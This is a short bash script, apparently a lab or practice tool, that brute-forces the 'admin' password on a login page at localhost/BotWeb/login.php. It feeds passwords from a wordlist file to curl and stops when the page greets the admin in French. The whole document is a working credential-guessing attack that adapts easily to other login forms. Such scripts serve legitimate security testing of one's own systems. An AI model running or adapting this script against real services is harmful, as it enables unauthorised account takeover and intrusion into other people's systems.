#!/bin/bash

user="admin"
#Main
while read pass
do
  echo "Testing $pass"
  response=$(curl -s -X POST 'http://localhost/BotWeb/login.php' \
              --data-urlencode "login=${user}" --data-urlencode "mp=${pass}")
  if [[ $response =~ ^.*Bienvenue[[:space:]]admin.*$ ]]
  then
    echo "Bingo: Mot de passe trouvé ($pass)"
    exit
  fi
done < $1
